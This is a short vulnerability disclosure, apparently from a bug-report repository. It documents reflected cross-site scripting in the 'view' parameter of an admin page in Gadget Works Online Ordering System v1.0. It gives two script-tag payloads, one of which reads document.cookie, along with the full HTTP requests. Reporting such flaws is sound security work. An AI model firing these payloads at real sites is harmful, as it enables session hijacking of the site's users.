# Gadget Works Online Ordering System v1.0 has Cross-site scripting (reflected)

BUG_Author: FinleyTang

Website source code address:https://www.sourcecodester.com/php/13093/gadget-works-online-ordering-system-phpmysqli.html

Vulnerability File: /philosophy/admin/products/index.php

Parameter "view" (GET), exists XSS vulnerability

Payload1:id=1&view=<script>alert(666)</script>

```
GET /philosophy/admin/products/index.php?id=1&view=%3Cscript%3Ealert(666)%3C/script%3E HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: revenue[LastUrl]=%2Frates%2Fadmin%2Fsystem_settingslist.php; PHPSESSID=ooahfvgv2fiakgi64k9djt6efv
Connection: close
```

![image](https://github.com/FinleyTang/bug_report/blob/main/xss1.png)

Payload2:id=1&view=<script>alert(document.cookie)</script>

```
GET /philosophy/admin/products/index.php?id=1&view=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: revenue[LastUrl]=%2Frates%2Fadmin%2Fsystem_settingslist.php; PHPSESSID=ooahfvgv2fiakgi64k9djt6efv
Connection: close
```

![image](https://github.com/FinleyTang/bug_report/blob/main/xss2.png)
